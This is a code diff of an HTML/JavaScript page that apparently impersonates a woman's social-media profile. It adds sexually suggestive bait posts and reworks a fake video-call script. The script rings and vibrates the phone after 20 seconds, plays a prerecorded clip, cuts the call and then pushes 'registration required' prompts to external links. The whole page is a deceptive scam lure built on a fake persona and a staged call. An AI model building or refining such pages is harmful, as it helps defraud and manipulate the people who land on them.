@@ -6,30 +6,11 @@
     <title>Jacklyn Rose - Profile</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
-    <!-- Smooth Auto Translation Script -->
-    <script type="text/javascript">
-        function googleTranslateElementInit() {
-            new google.translate.TranslateElement({
-                pageLanguage: 'en',
-                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
-                autoDisplay: true,
-                multilanguagePage: true
-            }, 'google_translate_element');
-        }
-    </script>
-    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-
     <style>
         :root { --fb-blue: #0084FF; --fb-bg: #FFFFFF; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { margin: 0; font-family: -apple-system, system-ui, sans-serif; background: #f0f2f5; overflow-x: hidden; width: 100%; height: 100%; }
         
-        /* Fixed Google Translate UI Issues */
-        .goog-te-banner-frame.skiptranslate, .goog-te-gadget-icon { display: none !important; }
-        body { top: 0px !important; }
-        #google_translate_element { display: none; }
-        .goog-te-menu-value span:nth-child(5) { display:none !important; }
-
         /* Profile Layout */
         .cover { width: 100%; height: 180px; background: url('https://github.com/pj9889/picvid/blob/main/pic3.webp?raw=true') center/cover; }
         .profile-card { background: white; text-align: center; padding-bottom: 20px; border-bottom: 1px solid #ddd; }
@@ -77,8 +58,6 @@
     </style>
 </head>
 <body onclick="enableAudio()">
-    <!-- Container for Google Translate -->
-    <div id="google_translate_element"></div>
 
     <audio id="ringtone" loop preload="auto">
         <source src="https://github.com/pj9889/aud/raw/refs/heads/main/audio%20(2).mpeg" type="audio/mpeg">
@@ -96,20 +75,60 @@
     </div>
 
     <div id="posts">
+        <!-- Post 1 -->
         <div class="post" onclick="handleAction('post')">
             <div class="post-head"><div class="mini-pfp"></div><div><strong>Jacklyn Rose</strong><br><small>2 hours ago</small></div></div>
             <div class="post-txt">I'm waiting for a special call tonight... will it be you? 💋💦</div>
             <img src="https://github.com/pj9889/picvid/blob/main/pic2.webp?raw=true" class="post-img">
             <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> 1.2k</span> <span>458 Comments</span></div>
         </div>
-
+        <!-- Post 2 -->
         <div class="post" onclick="handleAction('post')">
             <div class="post-head"><div class="mini-pfp"></div><div><strong>Jacklyn Rose</strong><br><small>2 days ago</small></div></div>
             <div class="post-txt">Do you like what you see? I have so much more to show you in private. 😈✨</div>
             <img src="https://github.com/pj9889/aud/blob/main/p1.webp?raw=true" class="post-img">
             <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> 3.5k</span> <span>892 Comments</span></div>
         </div>
-        <!-- (Rest of your original posts remain identical) -->
+        <!-- Post 3 -->
+        <div class="post" onclick="handleAction('post')">
+            <div class="post-head"><div class="mini-pfp"></div><div><strong>Jacklyn Rose</strong><br><small>3 days ago</small></div></div>
+            <div class="post-txt">Let's get a little closer tonight. 💋🔥</div>
+            <img src="https://github.com/pj9889/aud/blob/main/p2.webp?raw=true" class="post-img">
+            <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> 4.8k</span> <span>1.1k Comments</span></div>
+        </div>
+        <!-- Post 4 -->
+        <div class="post" onclick="handleAction('post')">
+            <div class="post-head"><div class="mini-pfp"></div><div><strong>Jacklyn Rose</strong><br><small>4 days ago</small></div></div>
+            <div class="post-txt">Feeling wild and lonely. 💦🍒</div>
+            <img src="https://github.com/pj9889/aud/blob/main/p3.webp?raw=true" class="post-img">
+            <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> 6.2k</span> <span>1.5k Comments</span></div>
+        </div>
+        <!-- Post 5 -->
+        <div class="post" onclick="handleAction('post')">
+            <div class="post-head"><div class="mini-pfp"></div><div><strong>Jacklyn Rose</strong><br><small>5 days ago</small></div></div>
+            <img src="https://github.com/pj9889/aud/blob/main/p4.webp?raw=true" class="post-img">
+            <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> 8.9k</span> <span>2.3k Comments</span></div>
+        </div>
+        <!-- Post 6 -->
+        <div class="post" onclick="handleAction('post')">
+            <div class="post-head"><div class="mini-pfp"></div><div><strong>Jacklyn Rose</strong><br><small>6 days ago</small></div></div>
+            <img src="https://github.com/pj9889/picvid/blob/main/pic4.webp?raw=true" class="post-img">
+            <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> 10.1k</span> <span>3k Comments</span></div>
+        </div>
+        <!-- Post 7 -->
+        <div class="post" onclick="handleAction('post')">
+            <div class="post-head"><div class="mini-pfp"></div><div><strong>Jacklyn Rose</strong><br><small>1 week ago</small></div></div>
+            <div class="post-txt">Thinking of you... 💖</div>
+            <img src="https://github.com/pj9889/picvid/blob/main/pic1.webp?raw=true" class="post-img">
+            <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> 12k</span> <span>4k Comments</span></div>
+        </div>
+        <!-- Post 8 -->
+        <div class="post" onclick="handleAction('post')">
+            <div class="post-head"><div class="mini-pfp"></div><div><strong>Jacklyn Rose</strong><br><small>1 week ago</small></div></div>
+            <div class="post-txt">Who's ready for a private show? 🍑💦</div>
+            <img src="https://github.com/pj9889/picvid/blob/main/pic3.webp?raw=true" class="post-img">
+            <div class="post-stats"><span><i class="fas fa-thumbs-up"></i> 15k</span> <span>5.2k Comments</span></div>
+        </div>
     </div>
 
     <!-- Call UI -->
@@ -121,7 +140,7 @@
         </div>
         <div class="call-actions">
             <button class="c-btn c-decline" onclick="terminateCall()"><i class="fas fa-phone-slash"></i></button>
-            <button class="c-btn c-accept" onclick="acceptCall()"><i class="fas fa-video"></i></button>
+            <button id="accept-btn" class="c-btn c-accept" onclick="acceptCall()"><i class="fas fa-video"></i></button>
         </div>
     </div>
 
@@ -145,7 +164,7 @@
     </div>
 
     <script>
-        let callCount = 0; // Track calls
+        let callCount = 0; 
         let audioEnabled = false;
         const ringtone = document.getElementById('ringtone');
 
@@ -159,32 +178,31 @@
             }
         }
 
-        // Auto Call after 20 Seconds
         setTimeout(() => {
             if(callCount === 0) startCall('incoming');
-            else if(callCount > 0) {
-                // If visitor already called manually, auto-call triggers reg lock on accept
-                startCall('incoming_restricted');
-            }
+            else { startCall('incoming_restricted'); }
         }, 20000);
 
         function startCall(type) {
+            const acceptBtn = document.getElementById('accept-btn');
             document.getElementById('call-ui').style.display = 'flex';
+            
             if(type === 'incoming' || type === 'incoming_restricted') {
+                acceptBtn.style.display = 'flex'; 
                 ringtone.play().catch(e => {});
                 if ("vibrate" in navigator) navigator.vibrate([1000, 500, 1000, 500, 1000]);
                 if(type === 'incoming_restricted') {
                     document.getElementById('call-ui').setAttribute('data-restricted', 'true');
                 }
             } else {
-                // Manual/Outgoing Call
                 if(callCount > 0) {
                    showReg("Access Restricted", "You have already used your free call. Register to continue.", LINK_GENERAL_CLICK);
                    document.getElementById('call-ui').style.display = 'none';
                    return;
                 }
+                acceptBtn.style.display = 'none'; // ভিজিটর কল দিলে রিসিভ বাটন হাইড থাকবে
                 document.getElementById('call-sub').innerText = "Ringing...";
-                setTimeout(acceptCall, 4000);
+                setTimeout(acceptCall, 4000); // ৪ সেকেন্ড পর অটো রিসিভ
             }
         }
 
@@ -192,7 +210,6 @@
             ringtone.pause();
             if ("vibrate" in navigator) navigator.vibrate(0);
             
-            // Check if this was a restricted auto-call
             if(document.getElementById('call-ui').getAttribute('data-restricted') === 'true') {
                 document.getElementById('call-ui').style.display = 'none';
                 showReg("Call Disconnected", "Registration required to receive more calls.", LINK_VIDEO_END);
@@ -203,7 +220,7 @@
             document.getElementById('video-container').style.display = 'block';
             document.getElementById('remote-video').play();
             
-            callCount++; // Increase call count
+            callCount++; 
 
             setTimeout(terminateCall, 13000);
             try {
